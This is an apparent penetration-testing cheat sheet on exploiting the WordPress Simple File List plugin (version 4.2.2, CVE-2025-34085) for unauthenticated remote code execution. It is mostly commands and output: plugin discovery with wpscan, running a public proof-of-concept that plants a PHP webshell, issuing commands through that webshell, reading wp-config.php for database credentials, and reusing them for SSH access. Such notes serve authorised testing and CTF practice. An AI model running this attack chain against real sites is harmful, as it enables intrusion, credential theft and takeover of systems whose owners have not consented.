# WordPress Simple File List

WordPress **Simple File List** versions around `4.2.2` can be abused for unauthenticated file upload / RCE. This is useful when WPScan finds the plugin under `/wp-content/plugins/simple-file-list/` and the WordPress site has public uploads enabled.

## Discovery

```bash
wpscan --url http://TARGET --enumerate p --plugins-detection aggressive
```

Look for:

```text
[+] simple-file-list
 | Location: http://TARGET/wp-content/plugins/simple-file-list/
 | Version: 4.2.2
```

Uploads commonly land under:

```text
http://TARGET/wp-content/uploads/simple-file-list/
```

## Pre-auth RCE

Public references:

* CVE-2025-34085 PoC

```bash
git clone https://github.com/0xgh057r3c0n/CVE-2025-34085.git
python3 CVE-2025-34085.py -u http://TARGET --cmd id
```

Expected output includes the uploaded PHP path:

```text
[DEBUG] Command Output:
uid=33(http) gid=33(http) groups=33(http)

[+] http://TARGET | http://TARGET/wp-content/uploads/simple-file-list/RANDOM.php
```

Use the webshell directly:

```bash
curl 'http://TARGET/wp-content/uploads/simple-file-list/RANDOM.php?cmd=id'
```

## Post-exploitation

Read WordPress config through the webshell and reuse any credentials:

```bash
curl 'http://TARGET/wp-content/uploads/simple-file-list/RANDOM.php?cmd=cat%20../../../wp-config.php'
```

High-value values:

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'username');
define('DB_PASSWORD', 'password');
define('DB_HOST', 'localhost');
```

If the DB username also exists as a system user, try SSH with the database password:

```bash
ssh username@TARGET
```

